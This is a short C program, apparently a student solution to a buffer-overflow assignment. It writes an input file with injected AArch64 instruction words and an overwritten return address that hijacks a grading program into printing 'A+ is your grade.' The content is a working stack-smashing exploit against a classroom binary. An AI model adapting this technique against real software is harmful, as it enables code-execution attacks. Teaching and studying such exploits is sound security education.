#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned int uiData1;
    unsigned int uiData2;
    unsigned int uiData3;

    uiData1 = 0x42006c; /* address to the instructions below; */
    uiData2 = 0x10000110; /* adr x0, 0x420074 */
    uiData3 = 0x17FF8201; /* b 0x400874 */

    psFile = fopen("dataAplus", "w");

    /* buf[0 - 17] */
    fprintf(psFile, "Maxwell and Melody");
    /* buf[18-19] */
    fprintf(psFile, "%c", '\0');
    fprintf(psFile, "%c", '\0');
    /* buf[20-23] */
    fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
    /* buf[24-27] */
    fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
    /* buf[28-47] */
    fprintf(psFile, "fillerfillerfillerf");
    /* buf[48-51] (x30) */
    fwrite(&uiData1, sizeof(unsigned long), 1, psFile);
    /* buf[52] (new text) */
    fprintf(psFile, "A+ is your grade.\n");
    return 0;
}